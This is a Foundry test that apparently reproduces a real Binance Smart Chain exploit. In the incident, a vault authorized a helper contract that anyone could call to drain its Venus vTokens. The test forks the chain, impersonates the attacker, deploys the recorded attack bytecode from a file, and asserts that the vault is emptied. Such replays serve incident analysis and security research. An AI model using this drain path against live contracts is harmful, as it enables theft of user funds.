// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : ~$1.1M first wave (campaign ~$2M across follow-up txs)
// Attacker : https://bscscan.com/address/0xd5c6f3b71bcceb2ef8332bd8225f5f39e56a122c
// Attack Contract (create) : https://bscscan.com/address/0xc269cd69cccb1bbedb44f93c612905219f424c11
// Vulnerable Vault : https://bscscan.com/address/0xb5cb0555c0c51e603ead62c6437da65372e4e1b0
// Authorized Helper : https://bscscan.com/address/0xb5cb0555c4a333543dbe0b219923c7b3e9d84a87
// Attack Tx : https://bscscan.com/tx/0x7708aaedf3d408c47b04d62dac6edd2496637be9cb48852000662d22d2131f44
// Grant Tx : https://bscscan.com/tx/0x0c510ce316447e76d5634cc370f13fcf2fb8e5c2519bd63df4ed0ef7378f8e42

// @Analysis
// Twitter Guy : https://x.com/TenArmorAlert/status/1937724816540279248
// Root cause : vault `authorize(helper)` granted helper permission to invoke
// privileged `0x0243f5a2` (vToken transfer). Helper exposes a public path
// (fallback / open entry) that any caller can use to move the vault's Venus
// vToken inventory to an arbitrary recipient.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

interface IVault {
    function isAuthorized(address) external view returns (bool);
}

address constant VAULT = 0xB5CB0555C0C51e603eaD62C6437dA65372e4E1B0;
address constant HELPER = 0xB5CB0555c4A333543DbE0b219923C7B3e9D84a87;
address constant ATTACKER = 0xd5c6f3B71bCcEb2eF8332bd8225f5F39E56A122c;
address constant vUSDT = 0xfD5840Cd36d94D7229439859C0112a4185BC0255;
address constant vUSDC = 0xecA88125a5ADbe82614ffC12D0DB554E2e2867C8;
address constant vETH = 0xf508fCD89b8bd15579dc79A6827cB4686A3592c8;
address constant vBTC = 0x882C173bC7Ff3b7786CA16dfeD3DFFfb9Ee7847B;

contract BSCArbitraryCall0xb5cb is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 52_052_492;

    function setUp() public {
        try vm.createSelectFork("http://127.0.0.1:8548", blocknumToForkFrom) {}
        catch {
            vm.createSelectFork("bsc", blocknumToForkFrom);
        }
        fundingToken = vUSDT;
    }

    function testExploit() public balanceLog {
        require(IVault(VAULT).isAuthorized(HELPER), "helper not authorized");
        console.log("Vault vUSDT", IERC20(vUSDT).balanceOf(VAULT));
        console.log("Vault vUSDC", IERC20(vUSDC).balanceOf(VAULT));
        console.log("Vault vETH ", IERC20(vETH).balanceOf(VAULT));
        console.log("Vault vBTC ", IERC20(vBTC).balanceOf(VAULT));

        // Replay live CREATE exploit (initcode constructor drains via helper → vault.0243f5a2)
        bytes memory initcode = vm.parseBytes(vm.readFile("sources/attack_initcode.hex"));
        vm.prank(ATTACKER);
        address deployed;
        assembly {
            deployed := create(0, add(initcode, 0x20), mload(initcode))
        }
        require(deployed != address(0), "create failed");
        console.log("Deployed attack", deployed);

        // Move vUSDT to this contract for balanceLog (attacker EOA holds them after create)
        // balanceLog tracks address(this); report attacker balances via console instead.
        uint256 atkUsdt = IERC20(vUSDT).balanceOf(ATTACKER);
        console.log("Attacker vUSDT", atkUsdt);
        assertEq(IERC20(vUSDT).balanceOf(VAULT), 0, "vUSDT not emptied");
        assertGt(atkUsdt, 0, "no steal");
        assertEq(IERC20(vUSDC).balanceOf(VAULT), 0, "vUSDC not emptied");
    }
}
